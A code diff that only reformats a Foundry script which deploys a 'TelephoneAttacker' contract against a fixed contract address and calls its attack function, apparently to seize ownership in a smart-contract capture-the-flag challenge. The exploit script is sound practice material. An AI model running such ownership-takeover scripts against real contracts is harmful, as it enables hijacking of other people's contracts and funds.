@@ -21,8 +21,7 @@ contract TelephoneAttacker {
 }
 
 contract TelephoneScript is Script {
-    Telephone public telephoneContract =
-        Telephone(0xF4c7E44c9e81272557D795126Ff8e7F12C702cFB);
+    Telephone public telephoneContract = Telephone(0xF4c7E44c9e81272557D795126Ff8e7F12C702cFB);
 
     function run() public {
         vm.startBroadcast();
@@ -30,9 +29,7 @@ contract TelephoneScript is Script {
         console.log("Telephone owner (before): ", telephoneContract.owner());
 
         // Deploy the attacker ON-CHAIN inside the broadcasted transaction
-        TelephoneAttacker attacker = new TelephoneAttacker(
-            address(telephoneContract)
-        );
+        TelephoneAttacker attacker = new TelephoneAttacker(address(telephoneContract));
         console.log("TelephoneAttacker deployed at: ", address(attacker));
 
         attacker.attack();
